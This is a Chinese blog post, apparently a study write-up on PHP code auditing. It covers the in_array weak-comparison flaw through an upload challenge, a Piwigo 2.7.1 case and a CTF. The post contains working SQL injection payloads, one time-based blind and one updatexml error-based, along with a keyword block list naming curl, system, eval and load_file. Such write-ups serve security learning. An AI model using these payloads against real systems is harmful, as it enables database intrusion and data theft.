---
title: "In_array函数缺陷"
date: 2020-02-06T17:47:24+08:00
draft: flase
tags: [代码审计]
categories: []
comment: true
---
In_array函数缺陷
<!--more-->

# php代码审计学习in_array函数缺陷

##in_array函数缺陷

### Wish List

- Code

```
class Challenge {
  const UPLOAD_DIRECTORY = './solutions/';
  private $file;
  private $whitelist;

  public function __construct($file) {
    $this->file = $file;
    $this->whitelist = range(1, 24);
  }

  public function __destruct() {
    if (in_array($this->file['name'], $this->whitelist)) {
      move_uploaded_file(
        $this->file['tmp_name'],
        self::UPLOAD_DIRECTORY . $this->file['name']
      );
    }
  }
}

$challenge = new Challenge($_FILES['solution']);
```

- 代码理解

**代码为一个文件上传的代码，如果文件名存在于1-24中，则上传文件**

- in_array函数

```
in_array
检查数组中是否存在某个值
```

- 题解

**php弱类型比较时，6php会转换为6，6在1-24中间，所以可以进行上传**

### piwigo2.7.1实例分析

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308143432.png)

#### 漏洞分析

- 于picture.php:332中

```
case 'rate' :
    {
      include_once(PHPWG_ROOT_PATH.'include/functions_rate.inc.php');
      rate_picture($page['image_id'], $_POST['rate']);
      redirect($url_self);
    }
```

**当case为rate时，将变量rate和变量image_id传入functions_rate.inc.php文件中的rate_picture函数**

- include/functions_rate.inc.php:38

```
or !in_array($rate, $conf['rate_items']))
```

**查找变量rate是否存在于$conf['rate_items']当中**

```
$conf['rate_items']
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308145619.png)

- 直接将rate进行了拼接

```
$query = '
INSERT
  INTO '.RATE_TABLE.'
  (user_id,anonymous_id,element_id,rate,date)
  VALUES
  ('
    .$user['id'].','
    .'\''.$anonymous_id.'\','
    .$image_id.','
    .$rate
    .',NOW())
;';
  pwg_query($query);

  return update_rating_score($image_id);
}
$query = '
INSERT
  INTO '.RATE_TABLE.'
  (user_id,anonymous_id,element_id,rate,date)
  VALUES
  ('
    .$user['id'].','
    .'\''.$anonymous_id.'\','
    .$image_id.','
    .$rate
    .',NOW())
;';
  pwg_query($query);

  return update_rating_score($image_id);
}
```

**只要rate为array(0,1,2,3,4,5)便可以进行绕过，而in_array第三位未设置为true**

- payload

```
1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# 
```

- sqlmap

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308174418.png)

### CTF 

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308181630.png)

- stop_hack函数

```
function stop_hack($value){
    $pattern = "insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval";
    $back_list = explode("|",$pattern);
    foreach($back_list as $hack){
        if(preg_match("/$hack/i", $value))
            die("$hack detected!");
    }
    return $value;
}
```

**stop_hack用来过滤一些危险函数**

- 注入

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308182616.png)

**获取get的ID，通过stop_hack进行过滤并拼接到sql语句中进行查询**

- 报错注入payload

```
and (select updatexml(1,make_set(3,'~',(select flag from flag)),1))
```
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200308183821.png)

- 参考

```
https://github.com/hongriSec/PHP-Audit-Labs/blob/master/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day1-4/files/README.md
https://xz.aliyun.com/t/2160
```